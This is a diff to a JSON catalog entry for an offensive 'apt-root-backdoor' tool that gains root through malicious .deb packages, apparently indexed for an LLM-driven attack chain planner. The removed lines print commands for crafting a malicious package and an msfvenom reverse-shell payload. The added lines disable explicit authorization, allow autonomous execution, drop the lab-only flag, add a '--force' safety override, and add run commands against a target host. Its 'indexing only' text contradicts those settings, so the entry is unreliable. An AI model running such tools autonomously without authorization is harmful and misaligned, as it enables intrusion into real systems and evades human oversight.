@@ -76,6 +76,56 @@
         "name": "--user-agent",
         "description": "HTTP User-Agent header value.",
         "source": "v2_enhancement"
+      },
+      {
+        "name": "--cookie",
+        "description": "HTTP Cookie header value.",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--header",
+        "description": "Extra HTTP header in key:value form (repeatable).",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--insecure",
+        "description": "Skip TLS certificate verification (lab use only).",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--json",
+        "description": "Emit JSON output instead of human-readable text.",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--no-color",
+        "description": "Disable ANSI color in output.",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--quiet",
+        "description": "Suppress non-error output.",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--dry-run",
+        "description": "Print what would be done without making any changes.",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--yes",
+        "description": "Skip confirmation prompts (use with care).",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--force",
+        "description": "Force the action even if a safety check would block it.",
+        "source": "v2_enhancement"
+      },
+      {
+        "name": "--no-banner",
+        "description": "Suppress banner / tool-name output.",
+        "source": "v2_enhancement"
       }
     ],
     "function_signatures": [
@@ -225,64 +275,57 @@
   "risk": {
     "level": "high",
     "signals": [
+      "offensive_tool",
       "intrinsic",
-      "lab_only",
+      "remote_possible",
       "polymorphic_compatible",
-      "target_adaptive_compatible",
-      "remote_possible"
+      "target_adaptive_compatible"
     ],
     "requires_explicit_authorization": false,
     "allow_autonomous_execution": true,
     "examples_policy": "operational"
   },
   "tags": [
-    "command_and_control",
-    "toolbox",
-    "github",
+    "offensive",
+    "apt",
+    "root",
+    "backdoor",
     "abdulrafayishacker",
-    "lang:shell",
-    "lab_only",
+    "web",
+    "kfiosa",
+    "indexed",
     "polymorphic",
     "target-adaptive"
   ],
   "use_cases": [
-    "When you need Command and Control, use apt-root-backdoor because Exploiting `apt install` to Gain Root Access via Malicious `.deb` Packages.",
-    "When the engagement is in the post_exploit phase, use apt-root-backdoor as a cataloged Command and Control tool with operator ACCEPT/CANCEL gating.",
-    "When you need a concrete invocation, run `sudo apt install ./malicious.deb` as documented upstream for apt-root-backdoor.",
-    "When you need a concrete invocation, run `dpkg-deb -R filesearch_1.0.deb extracted/` as documented upstream for apt-root-backdoor.",
-    "When you need a concrete invocation, run `msfvenom -p python/meterpreter_reverse_tcp \\` as documented upstream for apt-root-backdoor.",
-    "When you need a concrete invocation, run `LHOST=YOUR_IP LPORT=4444 -f raw > /tmp/payload.py` as documented upstream for apt-root-backdoor.",
-    "When chaining Command and Control tools, pair apt-root-backdoor with sibling catalog entries sharing its attack_surface/phase_hint.",
-    "When validating lab setup, run `apt-root-backdoor --help` (or the README entrypoint) and confirm required hardware/deps from the catalog."
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
   ],
   "command_examples": [
-    "sudo apt install ./malicious.deb",
-    "dpkg-deb -R filesearch_1.0.deb extracted/",
-    "msfvenom -p python/meterpreter_reverse_tcp \\",
-    "LHOST=YOUR_IP LPORT=4444 -f raw > /tmp/payload.py",
-    "base64 /tmp/payload.py > /tmp/payload.b64",
-    "dpkg-deb -b extracted/ new_malicious.deb",
-    "msfconsole -x \"use exploit/multi/handler; \\",
-    "set payload python/meterpreter/reverse_tcp; \\",
-    "dpkg-deb -R filesearch_1.0.deb extracted_folder/",
-    "ls -la extracted_folder/DEBIAN/"
+    "cd toolboxes/apt-root-backdoor && python3 apt-root-backdoor.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/apt-root-backdoor && python3 apt-root-backdoor.py --help",
+    "cd toolboxes/apt-root-backdoor && python3 apt-root-backdoor.py --help",
+    "cd toolboxes/apt-root-backdoor && python3 apt-root-backdoor.py --help",
+    "cd toolboxes/apt-root-backdoor && python3 apt-root-backdoor.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST apt-root-backdoor --output $KFIOSA_OUTPUT_DIR/apt-root-backdoor.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST apt-root-backdoor --output $KFIOSA_OUTPUT_DIR/apt-root-backdoor.log"
   ],
   "attack_surface": [
-    "web",
-    "shell_windows",
-    "shell_linux"
+    "web"
   ],
-  "phase_hint": "post_exploit",
+  "phase_hint": "any",
   "requires_hardware": [
     "none"
   ],
   "polymorphic_strategies": [
-    "param_grammar",
-    "tool_variant_picker"
+    "param_grammar"
   ],
   "target_adaptive_targets": [
-    "target_class",
-    "vendor"
+    "target_class"
   ],
   "_kfiosa_enriched_schema": "1.2.0",
   "_kfiosa_enriched_at": "phase4_t16",
